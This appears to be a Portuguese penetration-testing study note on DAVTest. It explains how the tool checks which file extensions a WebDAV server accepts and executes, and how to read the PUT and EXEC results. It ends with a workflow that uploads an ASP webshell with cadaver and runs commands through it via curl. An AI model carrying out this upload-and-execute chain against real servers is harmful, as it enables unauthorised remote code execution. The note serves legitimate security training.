# 🧪 DAVTest — Testando Permissões WebDAV

> Ferramenta automatizada para testar o que um servidor WebDAV permite executar.
> Descobre quais extensões de arquivo podem ser enviadas E executadas — a diferença crítica entre upload inofensivo e RCE.

---

## 🧠 O Que é DAVTest

**DAVTest** é uma ferramenta de teste específica para servidores WebDAV. Ela vai além de só verificar se PUT está habilitado — testa sistematicamente **quais extensões de arquivo o servidor aceita e executa**.

**A pergunta central que o DAVTest responde:**
> "O servidor deixa eu enviar um arquivo `.asp`? E ele **executa** esse arquivo quando acesso via HTTP?"

Upload + Execução = RCE via webshell.

---

## 🔧 Instalação

```bash
# Kali Linux (geralmente já vem instalado)
apt install davtest

# Verificar
davtest --help
```

---

## 🔧 Comandos

```bash
# Teste básico — testa todas as extensões padrão
davtest -url http://IP/

# Com credenciais
davtest -url http://IP/ -auth usuario:senha

# Diretório específico
davtest -url http://IP/webdav/

# Limpar arquivos de teste após execução
davtest -url http://IP/ -cleanup

# Extensões customizadas para testar
davtest -url http://IP/ -uploadfile shell.asp -uploadloc shell.asp

# Especificar cookie de sessão
davtest -url http://IP/ -cookie "PHPSESSID=abc123"
```

---

## 📋 Extensões Testadas por Padrão

O DAVTest testa automaticamente essas extensões:

| Extensão | Linguagem | Perigosa se Executada |
|---------|-----------|----------------------|
| `.asp` | ASP clássico (IIS) | ✅ RCE no Windows |
| `.aspx` | ASP.NET (IIS) | ✅ RCE no Windows |
| `.php` | PHP | ✅ RCE se PHP instalado |
| `.jsp` | Java (Tomcat) | ✅ RCE se Java |
| `.cfm` | ColdFusion | ✅ RCE se ColdFusion |
| `.pl` | Perl | ✅ RCE se Perl |
| `.cgi` | CGI | ✅ RCE se habilitado |
| `.txt` | Texto | ❌ Só upload |
| `.html` | HTML | ❌ Renderiza, não executa |
| `.jhtml` | Java HTML | ✅ Raramente |

---

## 📊 Interpretando o Output

O DAVTest reporta dois resultados distintos para cada extensão:

```
********************************************************
 Testing DAV connection
OPEN            SUCCEED:        http://IP
********************************************************
NOTE    Random string for this session: abcDEF12
********************************************************
 Creating directory
MKCOL           SUCCEED:        Created http://IP/DavTestDir_abcDEF12
********************************************************
 Sending test files
PUT     txt     SUCCEED:        http://IP/DavTestDir_abcDEF12/davtest_abcDEF12.txt
PUT     asp     SUCCEED:        http://IP/DavTestDir_abcDEF12/davtest_abcDEF12.asp
PUT     aspx    SUCCEED:        http://IP/DavTestDir_abcDEF12/davtest_abcDEF12.aspx
PUT     php     FAIL
PUT     jsp     FAIL
********************************************************
 Checking for test file execution
EXEC    txt     FAIL    (not executed - just text)
EXEC    asp     SUCCEED:        http://IP/DavTestDir_abcDEF12/davtest_abcDEF12.asp
EXEC    aspx    FAIL
```

**Decodificando:**

| Resultado | Significado |
|-----------|------------|
| `PUT SUCCEED` | Upload aceito — extensão não bloqueada |
| `PUT FAIL` | Upload recusado — extensão bloqueada ou sem permissão |
| `EXEC SUCCEED` | **Arquivo executado pelo servidor — RCE possível** |
| `EXEC FAIL` | Upload aceito mas servidor não executa a extensão |

> 🎯 `PUT SUCCEED` + `EXEC SUCCEED` na mesma extensão = vetor confirmado para webshell.

---

## 🔁 Workflow Completo

```bash
# 1. Verificar se WebDAV está ativo
nmap --script http-webdav-scan -p80 IP
# ou
curl -v -X OPTIONS http://IP/

# 2. DAVTest — descobrir o que é executável
davtest -url http://IP/ -cleanup

# 3. Analisar output:
#    Qual extensão teve EXEC SUCCEED?
#    → .asp? → usar ASP webshell
#    → .aspx? → usar ASPX webshell
#    → .php? → usar PHP webshell

# 4. Upload da webshell com Cadaver
cadaver http://IP/
dav:/> put /path/para/shell.asp

# 5. Acessar e executar
curl "http://IP/shell.asp?cmd=whoami"
```

---

## ⚠️ Extensão vs Execução — A Distinção Crítica

```
CENÁRIO 1: PUT habilitado, EXEC desabilitado
PUT shell.asp → SUCCEED (arquivo enviado)
GET shell.asp → Retorna o código-fonte (não executa)
Resultado: Sem RCE

CENÁRIO 2: PUT + EXEC habilitados
PUT shell.asp → SUCCEED (arquivo enviado)
GET shell.asp → Executa o código ASP
Resultado: RCE ✅
```

O servidor pode aceitar o upload mas **não executar** o arquivo se a extensão não estiver mapeada para um handler de script. DAVTest detecta exatamente isso.

---

## 📌 Relacionados

- [[IIS — Internet Information Services]]
- [[Cadaver — Cliente WebDAV]]
- [[ASP Webshell — Upload e Execução]]
- [[Nmap — NSE]]

#ferramenta/webdav #exploração #windows #iis
